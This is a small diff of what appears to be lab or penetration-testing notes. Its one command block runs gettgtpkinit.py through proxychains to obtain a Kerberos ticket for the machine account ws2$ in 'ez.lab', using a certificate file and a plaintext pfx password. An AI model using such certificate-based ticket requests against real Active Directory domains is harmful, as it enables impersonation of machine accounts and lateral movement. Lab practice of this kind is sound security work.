@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:05.079234+00:00'
 ```bash
 proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
 ```
+
+
